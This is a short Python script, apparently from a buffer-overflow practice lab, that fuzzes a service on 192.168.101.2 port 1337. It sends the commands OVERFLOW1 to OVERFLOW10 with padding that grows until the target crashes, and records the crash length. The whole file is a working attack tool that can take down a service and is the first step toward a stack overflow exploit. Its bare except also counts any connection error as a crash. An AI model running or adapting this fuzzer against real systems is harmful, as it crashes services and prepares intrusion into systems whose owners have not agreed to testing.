import socket
import time

IP = "192.168.101.2"  # Change this if the victim IP changes
PORT = 1337           # The target port

COMMANDS = [f"OVERFLOW{i}" for i in range(1, 11)]  # Testing OVERFLOW1 to OVERFLOW10
BUFFER_SIZE_INCREMENT = 100  # Start with 100 bytes, increase progressively
MAX_BUFFER_SIZE = 3000  # Stop at 3000 bytes (adjust if needed)

for command in COMMANDS:
    buffer = "A" * BUFFER_SIZE_INCREMENT
    print(f"[*] Testing {command} for buffer overflow...")

    while len(buffer) <= MAX_BUFFER_SIZE:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            s.send((command + " " + buffer + "\r\n").encode())  # Send the payload
            s.close()
            print(f"[*] Sent {len(buffer)} bytes to {command}")
            time.sleep(1)  # Give some time to prevent crashing too fast
            buffer += "A" * BUFFER_SIZE_INCREMENT  # Increase payload size
        except:
            print(f"[!!!] The server crashed at {len(buffer) - BUFFER_SIZE_INCREMENT} bytes on {command}")
            break  # Stop once the application crashes
